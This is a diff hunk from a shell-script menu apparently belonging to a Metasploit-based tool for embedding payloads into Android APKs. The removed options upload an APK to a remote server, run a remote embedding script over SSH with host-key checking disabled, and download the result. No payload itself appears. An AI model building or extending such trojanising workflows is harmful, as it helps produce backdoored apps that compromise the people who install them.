@@ -37,33 +37,6 @@ clear
 cd $metapath
 ./msfconsole
 tload
-elif [ $o = "upload" ] || [ $o = "Upload" ]
-then
-clear
-echo " Enter the path to the original apk WITH .apk extension."
-read -p ">|" upath
-rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" $upath sathvik@$host:/home/sathvik/payload
-sleep 3
-tload
-elif [ $o = "download" ] || [ $o = "Download" ]
-then
-clear
-echo " Please enter the final apk name WITH .apk extension."
-read -p ">|" dname
-echo " Please enter the download path."
-read -p ">|" dpath
-rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" sathvik@$host:/home/sathvik/embed/$dname $dpath
-echo
-echo
-echo
-echo
-echo "If there was no error seen while downloading, then you app has been downloaded to "$dpath " with a name "$dname
-sleep 5
-tload
-elif [ $o = "embed" ] || [ $o = "Embed" ]
-then
-clear
-ssh -i $dir/key sathvik@$host -t './t.sh && exit'
 elif [ $o = "2" ]
 then
 ./embed
